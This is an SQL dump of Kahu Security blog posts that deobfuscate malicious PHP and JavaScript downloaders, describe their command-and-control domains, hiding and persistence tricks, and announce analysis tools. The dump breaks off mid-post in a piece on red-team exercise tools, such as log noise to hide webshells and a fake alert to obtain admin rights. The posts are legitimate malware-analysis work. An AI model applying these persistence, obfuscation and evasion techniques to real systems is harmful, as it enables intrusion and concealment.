INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (13, 'Deobfuscating a Malicious PHP Downloader', 'darryl', 'October 15, 2016', 'A PHP script was sent to me by reader Nuno who got this from a hacked Joomla website and wanted to know what this was. He said this script was prepended to several legitimate PHP files. Looking into this a bit, I found that this is related to WordPress hacks via MailPoet back in 2014 according to Sucuri (here and here).\nThe original script from 2014 is pretty much the same as this one after you deobfuscate it so it appears that its creator updated the obfuscation layer since then. Here’s what the 2014 script looks like:\n\nAnd then it was modified some time later.\n\nThis is what the PHP script looks like today.\n\nAt the bottom is the code that deobfuscates the above. I make the following change as you can see.\n\nAnd I get the deobfuscated result.\n\nHowever, the result gets truncated. It’s probably because there’s HTML-looking tags in there so I have to modify my change to this:\n\nNow I can get the entire script.\n\nAfter I unescape it, I can see at the bottom a call to the deobfuscation function. I repeat the same step as above.\n\nTo get this:\n\nI keep doing this for two more rounds and I end up with this. The for-loop at the bottom deobfuscates the last remaining blobs by passing it to the “oo1” and “oo2” functions above.\n\nI grab functions from the previous rounds and put them all here. Finally you can see what this does.\n\nThe script gets some HTTP info, randomly selects a domain (33db9538 .com, 9507c4e8 .com, e5b57288 .com, or 54dfa1cb .com), and makes a request to its C&C using one of five methods until one works. The HTTP GET requests look something like this:\nhxxp://54dfa1cb .com/743373?nBcDCJtttnWOB7AFwE6JSD2%252 B9FWohBE48s54engkXvlo7MmPmabcMTRfK5tqJyYRYA4xsNOviBQDEFq2uGAIfWs%253 D.vxcX.60JI.vXyZAJNtdCnP.%252FkaXEZd1\nhxxp://33db9538 .com/941577?cqzyJtttwfqjfH%252FwfN8k7f%252 FSpz9SnXR016abcKoeOzkdP9zUs2oUlKyoGy6DqbbxOPukqZ5y%252FDEFLjNyQU2GGmY%253 D.Uazm.Bfm5.UXyZLzR9z6bi.EPWaPjBl\nNone of the sites were responding with anything useful at the time of this writing so I don’t know what the payload is but if it’s the same as it was back in 2014 then backdoors are created on the site and overwrites legitimate files in the process.\nThis is what all of the C&C websites look like:\n\nIf you get hit by this then you would probably need to do a fair amount of cleanup, restore from backups, or rebuild your site to ensure no backdoors are left behind.\nFile: 1.php\nMD5: 3ED6699CE373F6BEED22F490B1D93219\nVT: 2 / 54\nFile: 2.php\nMD5: 69A1CDF5E389D6388ABB3E6DA198D998\nVT: 8 / 54\nFile: 3.php\nMD5: 733C0DD3099C514A7D067D0A20657650\nVT: 4 / 54', 'joomla, mailpoet, obfuscated php, wordpress', 'http://www.kahusecurity.com/?p=13577\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (14, 'Javascript Leads to Browser Hijacking', 'darryl', 'October 8, 2016', 'I came across this nasty-looking script that hijacks your browser. It appears to have been around in some shape or form since 2014 but this latest version deploys an aggressive tactic I’ve not seen before. Here’s what this script looks like:\n\nThe script is composed of variables and functions but finding the beginning and ending of one is made difficult because of the lack of whitespace. This script uses tricks like encoded characters, regex search/replace, unusual base conversions, and conditional statements. \nHere’s an example of how the author obfuscated his/her script. I’ve highlighted one variable that gives you no clue as what it contains.\n\nIf you unescape the script, it becomes more readable but not by a lot.\n\nIf you evaluate it, you find that all that nonsense code does is build a string of letters and numbers. This is used to generate random strings later.\n\nHere’s how the obfuscation works. Look at the following statement:\n\"ca\"[(5.0+\":w\\x88ECZ~\\x89D&5Fr\"[\'charCodeAt\'](9)*932840649)[\"toString\"]((\"*t3\\x856<Ajl\\x87OfF\"[\'charCodeAt\'](2)*0+33.0))](/[c]/g,\"\");\nAnd focus on this part first:\n(5.0+\":w\\x88ECZ~\\x89D&5Fr\"[\'charCodeAt\'](9)*932840649)\nThis becomes:\n5 + 38 * 932840649 = 35447944667\nThen we look at this part:\n(\"*t3\\x856<Ajl\\x87OfF\"[\'charCodeAt\'](2)*0+33.0)\nWhich becomes:\n116 * 0 + 33 = 33\nWhen you combine the two statements above, you are essentially converting the long number from base33 to text which yields the word “replace”:\n[(5.0+\":w\\x88ECZ~\\x89D&5Fr\"[\'charCodeAt\'](9)*932840649)[\"toString\"]((\"*t3\\x856<Ajl\\x87OfF\"[\'charCodeAt\'](2)*0+33.0))]\nSo in short, the original statement can be distilled down to the following which returns “a”:\n\"ca\"[replace](/[c]/g, \"\");\nClever.\nHere’s some of the more interesting things this script does.\nThe script makes a copy of wscript.exe, renames it to something random, and saves it to a new folder in the user’s AppData\\Roaming directory. It then makes a copy of itself. The copy of wscript.exe is used to run the script. The script then sets the following registry keys to hide the folder.\n[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced]\n\"Hidden\"=dword:00000002\n\"ShowSuperHidden\"=dword:00000000\nIt then creates a shortcut to the script called “Start” and saves it to the user’s startup folder. The shortcut has a folder icon to trick the user. If the user double-clicks on the “folder”, he/she ends up running the script.\n\nThe script will check if it can get access to Microsoft, Google, or Bing. If so then it will continue and then proceed to send data about the computer to urchintelemetry .com and downloads an encrypted file from 95.153.31 .22 .\n\nThe downloaded file is another script. The highlighted section shows the attempt to change IE, Firefox, and Chrome’s start page to login.hhtxnet .com .\n\nIf you open your browser, you will end up redirected to portalne .ws .\n\nWhat’s interesting is that if you visit the CnC website, it looks broken.\n\nHowever, when a correct POST is made, you get a response but it’s not visible. Here you can see the HTML source contains a response hidden in the body tag.\n\nThe script makes use of WMI to ensure security software won’t interfere with its tasks. Here’s an excerpt that shows you the security-related software it’s tracking.\n\nIf any of the following programs are run, the process is terminated in an unusual way. Here we see that the script creates a fake error message to make the user think the program is not working.\n\nLet’s see this in action. Here I run Autoruns and the program quits and I get this on the screen.\n\nThere’s one more trick up its sleeve. Here’s the excerpt from the script.\n\nThis gem executes if you terminate the WScript process associated with the script. In other words, if you stop the script, your computer shuts down immediately.\nIf you end up with this script on your computer, you can easily get rid of it by restarting in Safe Mode (or logging into another account) then removing the startup link and roaming folder. If you wish to analyze the script while it’s running then simply rename your security tool to something benign.\nFile: sample1.js\nMD5: C8B5A9FB9D573B00E1B5E957BD294C11\nVT: 7 / 54\nFile: sample2.js\nMD5: 8EA3EE6DF8CF28ABB220CD8615CC654B\nVT: 18 / 54', 'browser hijacking, hhtxnet.com, javascript, wmi', 'http://www.kahusecurity.com/?p=13563\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (15, 'Tools Update', 'darryl', 'September 30, 2016', 'Several programs have been updated. You can find them on the Tools page.\nConverter\nNotable changes since the last version:\n– Changed textbox font to Courier to improve readability\n– Added reverse file option\n– Added compare files option\n– Consolidated extract and swap functions\n– Added count of rows\n– Added keep and strip differences to filter menu\n– Replaced Hex Format %00 option with %u00\n– Replaced Toggle Case format to separate lower/upper case\n– Improved Mixed CHR() to Text function\n– Added additional options to count delimiters\n– Fixed hex-to-text function to better handle nulls\n\nRegistry Dumper\nI was asked by a reader to suppress the multiple error popups that occur when scanning certain keys with SYSTEM privileges. In this release, only one error will appear then it won’t show up again.\n\nText Decoder Toolkit\nThis release is almost a complete re-write of the original version. A lot of things were moved around and included to make it more useful for CTF challenges. The startup takes a bit longer than usual because of the number of textboxes it has to render on the character substitution table form.\n\nURL Revealer\nThis version now includes the ability to show headers instead of just the URLs. Here’s two examples, a Locky downloader and script (thank you to Malware-Traffic-Analysis and VirusTotal Intelligence for samples). By default, only the URLs are displayed but you can enable the switch to show the headers.', 'converter, locky, registry dumper, text decoder, tools, urlrevealer', 'http://www.kahusecurity.com/?p=13547\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (16, 'Locky JS and URL Revealer', 'darryl', 'June 22, 2016', 'From various reports, it appears that the malicious Javascript files sent via email that pull Locky down is back.\nLet’s see what these scripts look like:\n\nAt the bottom of the script, is this function that reverses the string above, joins the characters, then evaluates it:\neval(aBN3DmdER7P.split(”).reverse().join(”));\nSince we’re dealing with JScript, we can just do this and capture the result instead of executing it:\nWScript.Echo(aBN3DmdER7P.split(”).reverse().join(”));\nNow we get this:\n\nThis script employs a lot of nonsense functions that just returns exactly what gets sent to it in an attempt to make it harder to figure out what’s going on.\nAfter I beautify the script and scan through everything, I come across the main function that downloads a file from the Internet. It’s using the familiar AJAX method.\n\nI echo out the URL array to see where the requests are going. There’s three URLs it’s attempting to connect to. If the site is up then Locky gets downloaded and executed.\n\nThis round of scripts are similar to the ones that were sent before the Locky gang took a break. If you’ve been tracking their scripts, you know that they make a lot of changes to bypass filters but they are essentially all AJAX downloaders.\nInstead of trying to keep up with their constant script variations, why not use a web proxy I thought? You just run the script in a VM and catch the URLs being called. There’s Fiddler, Paros, Burp, etc I could use but I thought I would try to make something more lightweight and portable.\nURL Revealer\nHere’s my take on a web proxy. This program will capture the request from these scripts and drop it so it won’t download the malware from the Internet. This way you can see the URLs and take the necessary action quickly and without having to deobfuscate the script.\nWhen you run URL Revealer (in a VM!), it will automatically set up a proxy server on port 8080 and write the captured URLs to a text file to the app path. You should open up your browser and test it to make sure it’s working properly before executing the script you want to analyze. You should also set your VM’s network adapter to “host-only” while doing this just to be safe.\nHere’s what it looks like when I run four recent Locky scripts plus two from the past two weeks:\n\nI killed the wscript process in between runs otherwise the script would just keep going. URL Revealer will ignore repeated hits to the same URL as long as it’s exactly the same as the one before.\nWhen you are done, press  to quit so that URL Revealer can disable the proxy server. If you forget, just run URL Revealer and hit enter a couple of times until it quits.\nIf you run the program from an elevated command line, you can change the proxy port as well as the capture filename.\n\nOver the past several months, I saw four methods used by various scripts to download malware from the Internet – ajax, winhttp, bitsadmin, and powershell. URLRevealer should detect and block the requests for all of these methods. If you encounter a new method, please let me know.\nYou can get the program here.', 'downloader, javascript, locky, proxy, urlrevealer', 'http://www.kahusecurity.com/?p=13540\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (17, 'Script Deobfuscator Updated', 'darryl', 'February 22, 2016', 'Continuing from my last blog post, I updated the program to handle the latest obfuscated Javascript technique. I made the logic generic in order to handle future versions and variants so the results may come out a bit weird (e.g. stray tick marks). But the main thing is that you’ll be able to see what these scripts are doing.\nI broke out the concatenation option by script type so this should improve the results somewhat better than before.\n\n\n\nI hope this works for most of the scripts you encounter. And thank you for your continued support!', 'deobfuscator, javascript, php, vbs', 'http://www.kahusecurity.com/?p=13527\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (18, 'Deobfuscating a Hideous-Looking JS Downloader', 'darryl', 'February 21, 2016', 'One of my readers, Stefano from zanna.it (thanks!), sent me this little gem:\n\nIn the midst of seemingly random strings, there are clues to its structure but there’s very little to go on. I started off by grabbing a portion of the script and having it show me what the variable contains.\n\nThe string of gibberish is lined up in an array but only the last value is collected. Here, you can see the individual characters that make up the call to the URL.\n\nI found another script that employs the same method. In this version, the values outside of the elements between parenthesis are collected. The first section spells out “ActiveXObject”.\n\nHere’s yet another script that uses the same method and then takes it up another level. The first section also spells out “ActiveXObject” but this time, it makes use of an interesting behavior where the first character of the string attached to the “.e()” property is collected. Note: You need to unescape the script to convert the decimal values to a single character.\n\nWriting a program to extract the correct value is a little tricky but doable. I’ll need to test this further before releasing the program but it seems to work.\nExample #1\n\nExample #2\n\nExample #3…for this one, I had to unescape the script first.\n\nIn these three example scripts, it downloads an executable, saves it to the temp folder then executes it.', 'javascript deobfuscation, javascript downloader', 'http://www.kahusecurity.com/?p=13521\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (19, 'Script Deobfuscator Released', 'darryl', 'February 15, 2016', 'The purpose of this tool is to help you perform static analysis on obfuscated scripts. It’s often easier to dynamically analyze scripts but there are times when you just don’t know where to start or you just want a high-level view of what’s going on with the script. This tool may be able to help you. \nI already wrote a tool called PHP Script Decoder but this new version has been re-written in .NET with new functionality and flexibility in order to handle PHP, Javascript, VBA, and VBS scripts.\nTo explain how to use this tool, let me show you how to tackle seven different obfuscated scripts.\nExample #1 (unphp) \nHere’s what the script looks like. Looking at the script, you’ll see an array of base64-encoded strings at the top. Following that are references to specific elements from the array.\n\nPaste in the script sections like so. The script you are trying to deobfuscate is at the top. The array of base64-encoded strings separated by commas in the middle section. I enter the search string value of “_705650624(#)” since that’s how the script at the top references the elements from the array (note: the pound sign is a wildcard and must be present). I select the “Array” method and click on the “Convert” button.\n\nThe results still show encoded strings so now I check the “Base64 Decode”, “Concatenate”, and “Keep Quotes” options and try again.\n\nThe script has been deobfuscated and much easier to read. The script won’t execute though because the strings are quoted (or unquoted) incorrectly.\nExample #2 (ddecode) \nHere’s the script we’ll be working on:\n\nFirst we need to unescape it so click on the “Unescape” button. If you right-click on the Output box, there’s an option to save the results to a text file. (You can right-click on the Input box and read in a file too.)\n\nClick on “Copy Output to Input” to move the result to the top. This script uses randomize variable names and assigns a value to it. The later portion references the value. \nThe tool will parse the script and load each variable and associated value into an array. It then does a search for the variable and replaces it with the value.\nChoose the “Random Vars 1” method. The delimiter for this script is a semi-colon and for the search string I enter ${“GLOBALS”}[“#”]=”*”; The pound sign is a placeholder for the variable name and the asterisk is the placeholder for the value.\nHere’s the result:\n\nExample #3 (unphp) \nThis script also uses random variable names but in this version, the strings are base64-encoded. The top portion defines the global variables while the lower section, beginning at “session_start()”, references them.\n\nPaste the script sections in the tool as follows then choose the “Random Vars 2” method and the “Base64 Decode” and “Keep Quotes” options. Note the search string has spaces in between so that it matches the script at the top.\n\nExample #4 (unphp)\nHere’s what the script looks like (I highlighted the key):\n\nThis script references an element in an array to build the values for its variables. The elements are based on the character position in the key.\nThe first step is to paste the entire script in the input box and choose the key lookup option. I use $f9[#] as the search string. In the Lookup Key box, paste the key and remove the starting and ending quotes. Also make sure the key you paste in has been properly escaped. You can see there’s concatenation going on so check the “Concatenate” option.\n\nExample #5 (ddecode) \nIn this example, we’re just interested in decoding the base64 strings.\n\nCopy the entire script to the Input box, choose the “Base64” method as well as the “Base64 Decode”, “Concatenate”, and “Keep Quotes” options. Make sure the delimiter and search string matches that of the script.\n\nExample #6 (pastebin) \nThis script is uses the Joomla exploit and contains decimal values making it tough to see immediately what this does.\n\nPaste the script into the Input box and choose the “ASCII” method.\n\nAlmost but it’s not concatenated. If you choose the “Concatenate” option, it won’t clean up everything. In the “Output Options” section, there’s a “Remove Chars” box. Enter a period and try again.\n\nExample #7 (pastebin) \nThis last example is a VBA script. It does a simple math calculation then the result is convert to its ASCII character equivalent.\n\nPaste the script in and choose the “Math” method.\n\nThe result shows decimal values but not the text equivalent.  So enter “chr(” into the “Pre Str” box and a closing parenthesis in the “Post Str” box.\n\nLook familiar? Now we can use the “ASCII” method to get the characters. I also entered an ampersand and space character in the “Remove Chars” box.\n\nThe resulting deobfuscated script will probably error out if you try executing it. Again, all this tool will do is try to make the script readable so you can better understand it. You may need to use this tool on parts of the script then put them back together yourself to figure things out.\nI tried to make the functions in this tool flexible and generic enough to handle whatever scripts come your way. However, if you encounter something new, please let me know. You can get the tool here.\nHappy reversing!', 'deobfuscation, javascript, php, script deobfuscator, vba, vbs', 'http://www.kahusecurity.com/?p=13512\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (20, 'Packing/Unpacking Javascript from DOS', 'darryl', 'February 6, 2016', 'Here’s one way to pack and unpack Javascript from the Windows’ command line. For this we use PhantomJS and Dean Edwards’ Javascript Compressor.\n1. Download PhantomJS from here.\n2. Download the JSPacker.js file from here.\n3. Put everything in a folder or on your desktop then in DOS type the following:\nC:\\> phantomjs jspacker.js pack in.txt out.txt\n-or-\nC:\\> phantomjs jspacker.js unpack in.txt out.txt', 'dean edwards, javascript compressor, javascript packer, phantomjs', 'http://www.kahusecurity.com/?p=13491\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (21, 'Javascript Deobfuscator Updated', 'darryl', 'January 9, 2016', 'This program was originally written as a proof of concept but it turned out to work out pretty well so I’ve added several new features to this program to make it more robust and helpful. It still can’t do sophisticated scripts, for those use Revelo.\nTo show you what’s been added, I’ll go through a few live examples taken from Dynamoo’s pastebin (Conrad has a great site documenting malicious emails — check it out!).\nExample #1 (pastebin)\nIn this latest version, you can click on the “Clues” button and the program will highlight text that will give clues on how to deobfuscate the script. If the script is long, it may take awhile.\nYou can see that “eval” is highlighted. If I try deobfuscating just on “eval”, it won’t work because of the way the script is written. I now need to find out what’s calling the function “szkmYVRfAFZYusP”.\n\nI click on the “Reset” button to clear the highlights. I type in “szkmYVRfAFZYusP” then click on the “Highlight” button to find all instances of this string. Scroll down to the bottom and you can see what’s calling it.\n\nI double-click on the string “szkmYVRfAFZYusP” and click on “Convert”. The script is now deobfuscated.\n\nExample #2 (pastebin)\nThis script is somewhat painful to deal with. You need to find out where the eval is called. Let me try searching for “eval”. No luck. Let me try “this”. I find it near the top.\n\nNow let me search for the variable name “mek”. I find that about 2/3rds of the way down.\n\nFinally I search for “wozv”. Going back up, I find it calling the variable “mhnW”.\n\nMy guess is “wozv” will evaluate the concatenated script held in “mhnW” (which it is). Highlighting the verb, “wozv” won’t work so let me highlight the function name and variable. To use this method the variable name must be enclosed in single parenthesis.\n\nSince the input textbox is actually a richtext box, selecting the text can be tricky. Hold down ALT while you use your mouse to select the text. Or click on the first letter, hold down the SHIFT key and use the arrow keys to select the text.\nExample #3 (pastebin)\nFor this script, I just searched for “eval” which is found about 1/5th down.\n\nDeobfuscating on “eval” won’t work for this script. But let me try it on the variable name which it’s evaluating. Done.\n\nYou can get the updated tool here. And remember to use this in a VM, there’s absolutely no safeguards built in!', 'deobfuscation, javascript, jsdeobfuscator', 'http://www.kahusecurity.com/?p=13482\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (22, 'Text Decoder Toolkit', 'darryl', 'November 17, 2015', 'Here’s a challenge for you, what does this decode to?\nT{4 G=C 9<=E B63 3<3;G /<2 9<=E [email protected]:4^ G=C <332 <=B 43/@ B63 @3AC:B =4 / 6C<[email protected] 0/BB:3A` {4 G=C 9<=E [email protected]:4 0CB <=B B63 3<3;G^ [email protected] [email protected] [email protected] 5/7<32 G=C E7:: /:A= [email protected] / 2343/B` {4 G=C 9<=E <[email protected] B63 3<3;G <[email protected] [email protected]:4^ G=C E7:: AC11C;0 7< [email protected] 0/BB:3`T _ !C< \"HC^ \"63 [email protected] =4 %/@\nI was asked by a couple of folks to help them decode this (this isn\'t the exact string but it\'s similar). This was from a CTF and they couldn\'t figure it out. The challenge already ended so they just wanted to learn how to tackle stuff like this in the future. Unlike the real world, there is often an accompanying script or program that decodes this. You hardly encounter an encoded string and then asked to figure it out cold.\nCTF pros could probably do this faster than 10 minutes but that\'s how long it took me with Calculator and Notepad. I should have used a spreadsheet. After I was done, I thought I would write a program for myself to see if I can decode strings like this much faster.\nSo how do you even start decoding this? I came up with three methods but I\'m sure there are other, better ways. \nMethod #1 - Character Frequency\nClick on the \"Statistics\" tab then click on the \"Get Stats\" button. This will count the number of times each letter appears in the script. You see that 3 and = are the most common characters (besides the space).\n\nUsing this as a guide we know that the most common English letters are E T A O I N S H R . Let\'s see what the difference is between 3 and e. Enter those values in the \"Difference\" section and click on the \"Calculate Difference\" button. I get \"50\".\n\nNow click on the \"Decoder\" tab, enter the value \"50\", choose \"Character Shift\" then click on \"Decode\". Looks like we partially decoded it.\n\nMethod #2 - Enumeration\nThe second method dumps a text file that enumerates through all of the possible values. Choose the \"Enumerate to File\" action and the \"Character Shift\" operator.\n\nExamine the resulting file and look for clues. I searched for \"the\" and found multiple hits but the one at line #50 looks promising. The line #50 means that the character shift value of 50 was used.\n\nAt this point you can go to the Decoder tab and do a character shift with a value of 50 like we did above.\nMethod #3 - Distance Calculator\nThe number of characters between two letters will be the same as long as the XOR or character shift value remains constant.\nFor example,\nThe character distance between the letters h-e-l-l-o is -3, 7, 0, and 3 (i.e. the difference between h and e is -3, between e and l is 7, and so on). If we shifted \"hello\" with a value of 10, the resulting string is \"rovvy\" and the distance between r-o-v-v-y is still -3, 7, 0, and 3.\nOn the \"Statistics\" tab, you can search for \"the\" or any other word that has three or more characters and the toolkit will try to find the same character distance in the input string.\n\nCustom Substitution Table\nThe three different methods revealed the character shift value of 50 as our starting point but we still have some undecoded text to contend with.\n\nIn the output box, it looks like the third character is \"f\" so the preceeding character might be \"I\" as in \"If\". There\'s two other instances so it looks probable but let\'s test this theory out.\nGoing back to the \"Statistics\" tab, I highlight a character that should be an \"I\" then click on \"Get Highlighted Char\". The program will extract the corresponding characters from both the input and output boxes.\nIn this example, I think that the left curly brace should be a capital \"I\" so I make that change then click on the \"Calculate Difference\" button. I get \"-50\".\n\nSo it looks like we have two different character shift values. How would I decode using two values? I need to remap characters and I also need to display the ASCII table so I can visually determine what to map. The \"Custom Substitution Table\" is what I came up with.\nIf you enter a value on the header row, the values will be copied down the column. If you need to enter a value for a specific character, just enter it into the appropriate box. In this example, the space character in the input string was being shifted to \"R\". I want to leave this alone so I enter \"0\" in the \"032 - SPC\" box.\n\nYou can download the program here. If this program is used outside of CTFs, I would really like to know.', 'decoder, deobfuscation, obfuscation, xor', 'http://www.kahusecurity.com/?p=13470\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (23, 'Deobfuscating Magento Guruincsite Javascript', 'darryl', 'October 21, 2015', 'I saw this blog post by the super talented guys over at Sucuri and thought that it was just another URL redirection script hiding behind escaped characters but it turned out to be better than that.\nHere’s what the script looks like in its original form:\n\nWhen you unescape it, it looks like this. Notice that there’s two sections. The self-executing function at the top and another at the bottom. The function at the top deobfuscates the blob of characters in the middle and makes an array out of it. The bottom function takes values from a resulting array to redirect the user to the drive-by site. \n\nIn the screenshot above I put an arrow where the main deobfuscation takes place. It reads in the blob of characters, two at a time, and does a base30 decode then subtracts a value from an array. The array is made up of four characters which is the length of the script itself, 1,867 characters. The algorithm subtracts the ASCII representation of those four numbers.\nWhat this means is that if you change anything in the script, the script will break and won’t properly decode the blob.\nLet’s deobfuscate this script dynamically and statically.\nThere are several ways to deob this dynamically but here’s the most straightforward and easiest I think. In this screenshot I add an “alert(LCWEHH);” so I can see the result of the deobfuscation.\n\nWhen I run it, I get garbage because I modified the length of the script.\n\nLet me try this again. Since the deobfuscation routine is based on the length of the script I need to subtract what I’m adding in. So “alert(LCWEHH);” is 14 characters. \n\nI need to find a place in the script, after it’s done with the deobfuscation, where I can subtract 14 characters to keep the length the same. Here’s something I can replace (highlighted in red). I can remove the “(LCWEHH[2-4+1+3])” without causing an error.\n\nIf you notice this string is 17 characters so I need to add 3 characters back to the script. So I just pad my alert call with three spaces. Here’s the final script:\n\nWhen I run it, I get the deobfuscated results:\n\nNow I can build the redirection function using the values from this array so it looks like this:\n\nNow let’s do the same thing statically. For this I’ll use Converter.\nFire it up and paste in the blob of characters from the middle of the script.\n\nClick on Tools > Convert Base\n\nMake the following selections then click on Convert. I click on “Send Data to Main Form” to send the result to the main screen.\n\nI need to change this to comma delimited so I just click on Search/Replace Text and replace spaces with commas.\n\nNext, I click on the “Copy Output to Input” button then on Tools > Key Search/Convert.\n\nFinally I make these selections and click on Convert.\n\nWhat I did was use Converter’s built-in expression engine which takes the decimal val(ue), subtract the previous res(ult) then subtract the ASCII value of the first digit of the script’s length which is 49 (remember the total length of the script is 1,867). I add a comma then repeat the expression using the second digit of the script’s length which is 56 and so on. Since I selected the Consecutive action, it will loop through these four expressions across the entire decimal value input.\nSo basically, Converter is doing this calculation for me:\n164 – 49 – 0 = 115 = s\n270 – 56 – 115 = 99 = c\n267 – 54 – 99 = 114 = r\n274 – 55 – 114 = 105 = i\n:\nNow I can replace the original Javascript with the values from the above results to see how it does the redirection.\nBy the way, if you need help with the expression engine, click on Extras > Expressions Help\n\nHappy deobfuscating!', 'converter, javascript deobfuscation, magento', 'http://www.kahusecurity.com/?p=13459\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (24, 'Javascript Deobfuscator Updated', 'darryl', 'October 20, 2015', 'Just a quick update…I added a Javascript beautification feature. Just click on the “Beautify” button and the results will appear at the bottom.\n\nI did get some people emailing me saying that they got an error message. I compiled this to .NET Framework 4.5 so make sure you have this installed. I tested this version on 32-bit and 64-bit and it works for me.\nThe new version is available on the Tools page.', 'javascript deobfuscation', 'http://www.kahusecurity.com/?p=13441\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (25, 'New Javascript Deobfuscator Tool', 'darryl', 'October 16, 2015', 'This particular spam page redirect was brought to my attention by a colleague because it was getting past the web filters using Javascript obfuscation. In one version, the landing page uses a meta refresh tag. I guess it was getting caught too easily so they upped their game and are now using several layers of Javascript obfuscation.\nIt starts off with spammy emails with links that look like this:\nhxxp://panacheve .com/interest.php?w2n4\nhxxp://compareukshops.azurewebsites .net/justice.php?p8hw2\nThese sites send you to a redirector:\nhxxp://it8vn4 .net/?a=353900&c=wl_con&s=doptilazer\nhxxp://com-afp .net/?a=362298&c=wl_con\nWhich in turn redirects you to a spam page which uses a variety of subdomains:\nhxxp://136-healthandbeauty.it8vn4 .net/\nhxxp://518-healthandbeauty.4pxp0 .net/\nhxxp://281-weightloss.gt9dg7 .net/\nhxxp://341-weightloss.orelr3 .net/\nhxxp://807-weightloss.gt9dg7 .net/\nhxxp://948-diet.z3jdra .net/\nhxxp://999-diet.z3jdra .net/\nhxxp://442-fitness.4pxpo0 .net/\nHere’s what the spam pages look like:\n\nIf you strip away the URL parameters and visit the site, you should see something like this.\n\nThe Javascript base64-decodes a string that’s been reversed. You can see that there’s an eval at the end which executes the result. Before I introduce a new tool, let me show you how to quickly deobfuscate this with Revelo via two methods. With the first method, paste in the script, choose “Redirect Eval to Action”, then click on “Execute”.\n\nClick on the “Results” tab to get the results.\n\nCopy that script and paste it on the main tab. Revelo needs to see the <script></script> tags so make sure it’s there. We can see that the script is packed with eval at the beginning but since this script is packed multiple times, you will notice it has “eval” near the end of the script too. We need to tell Revelo to catch the “eval” at the beginning so click on Options > Replace Starting at Top. Leave the deobfuscation method as-is then click on “Execute” again. \n\nClick on the “Results” tab to get the results. You need to do this a couple more times before you end up with this. You will see the script now using “document.write” so choose “Redirect Do.Write to Action”.\n\nFinally, we get to the deobfuscated script.\n\nIf you just want to get to the final redirect URL without going through the above steps then you can select either “Capture HTTP Request via Proxy” or “Capture HTTP Request via IE”. This is the second method.\n\nWith either option, Revelo will execute the script and block the HTTP request to the website then show you where it was going to go. This keeps your computer safe but you should always run Revelo in a VM just in case these scripts use exploits or call another app to make the HTTP request.\n\n \nIntroducing Javascript Deobfuscator\nI’ve been spending the past several months porting my tools over to .NET. I apparently have written dozens of programs over the years so there’s still a whole bunch more to do. I started to think about Revelo and wondered if I should start from scratch and redesign it to make it easier to use. As a proof of concept, I came up with this tool.\nIt’s very basic and can probably only handle simple Javascript obfuscation but it might be a good standalone tool for quick and easy deobfuscation.\n\nLet me run it through the above script to show you how this program works. Paste the Javascript code into the input field without any HTML tags. You must also remove the <script></script> tags. Simply identify the verb you want to have the tool deobfuscate. Here, I just select the word “eval”.\n\nI click on “Convert” and the deobfuscated result appears. This is the second layer of obfuscation just as we saw above with Revelo.\n\nI click on the “Copy Output to Input” button so I can work on the resulting script. Once again, I select the word “eval” at the beginning and click on “Convert” again. I do this three more times until I get this. Now I highlight the verb “document.write”. When highlighting the verb make sure you don’t include any stray characters like a parenthesis, comma, etc. You will probably end up with no results.\n\nAnd I get the final deobfuscated results!\n\nI tried to make it as easy as “Select-Click-Deobfuscate”. In some ways this might be better to use than Revelo since you can specify exactly which verb to target. You can use this to deobfuscate function calls, variables, and other verbs but I haven’t fully tested it yet. I can tell you that this program can’t do DOM so it will be limited compared to Revelo.\nA word of caution if you use this tool! There are no safeguards built into this program so if you mess up on a script that has an exploit or shellcode in it, your computer could get hosed. Do this in a virtual machine, preferably without anti-virus running or it will incorrectly flag this tool as being malicious just like Revelo.\nYou can get Javascript Deobfuscator from the Tools page.', 'javascript deobfuscation, revelo', 'http://www.kahusecurity.com/?p=13440\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (26, 'Cyber Exercise Tools', 'darryl', 'October 3, 2015', 'For the past two years, I’ve been involved with several cyber exercises and competitions from planning, training, as well as participating in them. I’ve written a dozen or so defensive and offensive tools for these cyber ranges. While there’s better tools out there that do the same thing, I wanted to customize my own for the 64-bit environment and battle-test them to work out any bugs. Rules for some of these exercises and competitions state that any tool can be used as long as it’s publicly available so that’s why I’m posting some of the tools here.\nWelcome Mat\nThis is a program for the blue team. It will try to listen on unused ports from 1 through 1024 where possible. The idea is to make it hard for the red team to figure out which services your server is running.\nHere’s what the tool looks like. You can only listen to up to 1024 ports at a time.\n\nWhen the red team does an nmap scan, here’s what it looks like:\n\nExperienced red teamers should be able to figure out which ports are truly open.\nCover Fire\nDuring these exercises, it’s hard to be slow and quiet since the blue team knows you’re coming. You can do some misdirection here or launch a decoy there but it’s hard to hide. This is a program for the red team. This will perform a series of random GETs and POSTs to specific webpages with a variety of user-agents. This should fill up the web server logs and make it challenging for the opposing side to figure out where your webshells are.\nThe program takes in a text file of hosts/IPs. The other text file it needs is the URLs to request. Sample files are included. You will need to spider your target website first and generate a list of URLs yourself.\n\nHere’s what the server logs look like when the tool is running. Can you find the webshell?\n\nBlue team members who know their stuff should be able to find the webshell no matter if the logs contain a lot of noise.\nFake Defender Alert\nThis program attempts to fool the blue team member into granting it admin privileges. It uses the same 